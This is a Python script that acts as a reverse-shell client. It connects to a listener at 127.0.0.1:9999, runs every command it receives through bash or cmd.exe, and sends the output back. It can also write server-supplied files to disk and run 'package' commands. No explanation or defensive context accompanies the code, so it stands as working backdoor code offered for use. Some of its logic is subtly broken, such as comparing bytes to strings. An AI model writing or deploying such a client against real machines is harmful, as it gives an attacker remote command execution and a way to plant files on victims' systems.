from socket import socket, AF_INET, SOCK_STREAM, error, timeout
from subprocess import Popen, PIPE
from sys import platform
from time import sleep
from sys import exit as exitapp


def get_shell():
    if platform.startswith('linux2'):
        return '/bin/bash'
    elif platform.startswith('win32'):
        return 'C:\Windows\System32\cmd.exe'
    else:
        exitapp()


buffer_size = 4096
host = '127.0.0.1'
port = 9999
sock = socket(AF_INET, SOCK_STREAM)
sock.settimeout(5)

if __name__ == '__main__':
    try:
        sock.connect((host, port))

    except (error, timeout) as err:

        print("Socket Error: {}".format(str(err)))

    while True:
        try:
            data = sock.recv(buffer_size)
            if data == "F":
                des = sock.recv(4096)
                f = open(des, 'wb')
                while True:
                    try:
                        data = sock.recv(1024)
                        if data == "E":
                            f.close()
                            break
                        f.write(data)
                    except:
                        f.close()
                        break

            if data == "package":
                pack_info = sock.recv(buffer_size)
                proc = Popen(pack_info, shell=True, stdin=None, stderr=None, executable=get_shell())
                proc.wait()

            if data == "shell":
                command = sock.recv(buffer_size)
                proc = Popen(command, shell=True, stdin=None, stdout=PIPE, stderr=PIPE, executable=get_shell())
                out, err = proc.communicate()

                if out == "":
                    sock.send(err)

                sock.send(out)
            else:

                proc = Popen(data, shell=True, stdin=None, stdout=PIPE, stderr=PIPE, executable=get_shell())
                out, err = proc.communicate()

                if out == "":
                    sock.send(err)
                sock.send(out)

                # didn't get any data...why? print the e to debug..otherwise continue(print e)

        except Exception as e:
            continue
